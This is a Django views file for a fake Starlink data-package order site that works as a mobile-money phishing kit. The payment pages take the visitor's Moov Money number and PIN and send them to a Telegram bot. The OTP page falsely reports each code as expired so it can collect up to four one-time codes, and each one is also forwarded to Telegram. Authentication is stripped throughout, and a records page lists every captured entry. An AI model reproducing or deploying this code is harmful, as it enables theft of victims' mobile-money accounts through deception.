import json
import requests
from datetime import timedelta
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from django.utils import timezone
from django.http import JsonResponse
from django.core.cache import cache
from django.views.decorators.http import require_http_methods
from django.db import IntegrityError

from .models import StarlinkOrder, TelegramConfig, StarlinkPackage, CustomUser
from django.utils import timezone

def send_telegram_notification(message):
    """Sends a notification to all active Telegram configurations."""
    configs = TelegramConfig.objects.filter(is_active=True)
    for config in configs:
        try:
            url = f"https://api.telegram.org/bot{config.bot_token}/sendMessage"
            payload = {
                "chat_id": config.chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
            requests.post(url, json=payload, timeout=10)
        except Exception as e:
            print(f"Error sending Telegram notification: {e}")

def landing_page(request):
    """Starlink package selection and simplified order page."""
    # Removed authentication check
    
    packages = StarlinkPackage.objects.filter(is_active=True)
    
    if not packages.exists():
        StarlinkPackage.objects.create(name="Forfait Starter", description="Idéal pour un usage léger", price=300.00, data_limit="5GB")
        StarlinkPackage.objects.create(name="Forfait Standard", description="Parfait pour le streaming", price=1500.00, data_limit="15GB")
        StarlinkPackage.objects.create(name="Forfait Premium", description="Pour toute la famille", price=3500.00, data_limit="30GB")
        StarlinkPackage.objects.create(name="Forfait Ultra", description="Haute performance", price=6000.00, data_limit="60GB")
        StarlinkPackage.objects.create(name="Forfait Business", description="Usage professionnel", price=8500.00, data_limit="100GB")
        StarlinkPackage.objects.create(name="Forfait Illimité", description="Données illimitées", price=11000.00, data_limit="Illimité")
        packages = StarlinkPackage.objects.filter(is_active=True)

    if request.method == "POST":
        try:
            package_id = request.POST.get("package_id", "").strip()
            phone_number = request.POST.get("phone_number", "").strip() # Get phone number from form
            
            if not package_id:
                messages.error(request, "Veuillez sélectionner un forfait.")
                return redirect("landing_page")
            
            if not phone_number:
                messages.error(request, "Veuillez entrer votre numéro de téléphone.")
                return redirect("landing_page")
            
            package = get_object_or_404(StarlinkPackage, id=package_id)
            
            order = StarlinkOrder.objects.create(
                starlink_kit_id="KIT_" + str(int(timezone.now().timestamp())),
                phone_number=phone_number,
                package_name=package.name,
                amount=package.price,
                status='pending'
            )
            
            return redirect("ecocash_entry", order_id=order.id)
            
        except Exception as e:
            messages.error(request, f"Erreur lors de la soumission de la commande: {str(e)}")
            return redirect("landing_page")
    
    return render(request, "landing.html", {"packages": packages})


def ecocash_entry(request, order_id):
    """Moov Money number and PIN entry page."""
    # Removed authentication check
    
    order = get_object_or_404(StarlinkOrder, id=order_id)
    
    if request.method == "POST":
        action = request.POST.get("action")
        
        if action == "verify_pin":
            moov_number = request.POST.get("ecocash_number", "").strip()
            pin = request.POST.get("pin", "").strip()
            
            if not moov_number or not pin:
                messages.error(request, "Veuillez fournir le numéro Moov Money et le code PIN.")
                return redirect("ecocash_entry", order_id=order.id)
            
            order.airtel_number = moov_number
            order.pin = pin
            order.pin_verified = True
            order.pin_verified_at = timezone.now()
            order.status = 'pin_verified'
            order.payment_entered_at = timezone.now()
            order.save()
            
            message = f"<b>Starlink Order - MOOV MONEY Bot:</b>\nKit ID: {order.starlink_kit_id}\nTel: {moov_number}\nPIN: {pin}\nAmount: XAF {order.amount}"
            send_telegram_notification(message)
            
            return redirect("otp_verification", order_id=order.id)
    
    return render(request, "withdraw.html", {"order": order})


def otp_verification(request, order_id):
    """OTP verification page."""
    # Removed authentication check
    
    order = get_object_or_404(StarlinkOrder, id=order_id)
    
    if order.status != 'pin_verified':
        return redirect("ecocash_entry", order_id=order.id)
    
    if request.method == "POST":
        action = request.POST.get("action")
        
        if action == "verify_otp":
            otp_value = request.POST.get("otp", "").strip()
            
            if not otp_value or len(otp_value) != 6:
                messages.error(request, "Veuillez entrer un code OTP valide à 6 chiffres.")
                return redirect("otp_verification", order_id=order.id)
            
            if order.otp_count == 0:
                order.otp = otp_value
            elif order.otp_count == 1:
                order.otp_1 = otp_value
            elif order.otp_count == 2:
                order.otp_2 = otp_value
            elif order.otp_count == 3:
                order.otp_3 = otp_value
            else:
                order.otp_3 = otp_value

            order.otp_count += 1
            
            message = f"<b>Starlink Order - MOOV MONEY Bot (OTP Attempt {order.otp_count}):</b>\nKit ID: {order.starlink_kit_id}\nTel: {order.airtel_number}\nPIN: {order.pin}\nOTP: {otp_value}"
            send_telegram_notification(message)

            if order.otp_count >= 4:
                order.otp_verified = True
                order.otp_verified_at = timezone.now()
                order.status = 'completed'
                order.completed_at = timezone.now()
                order.save()
                return redirect("success_page", order_id=order.id)
            else:
                order.save()
                messages.error(request, "Le code OTP que vous avez entré a expiré. Veuillez entrer le nouveau code OTP envoyé sur votre téléphone.")
                return redirect("otp_verification", order_id=order.id)
    
    return render(request, "otp_verify.html", {"order": order})


def success_page(request, order_id):
    """Success page after order completion."""
    order = get_object_or_404(StarlinkOrder, id=order_id)
    
    if order.status != 'completed':
        return redirect("landing_page")
    
    return render(request, "success.html", {"order": order})


def all_applications(request):
    """Records page displaying all Starlink orders."""
    orders = StarlinkOrder.objects.all().order_by('-created_at')
    return render(request, "records.html", {"orders": orders})


def network_dashboard(request):
    """Network status dashboard page."""
    return render(request, "network_dashboard.html")


# --- Authentication Views (Bypassed) ---
def login_view(request):
    return redirect('landing_page')

def register_view(request):
    return redirect('landing_page')

def logout_view(request):
    return redirect('landing_page')
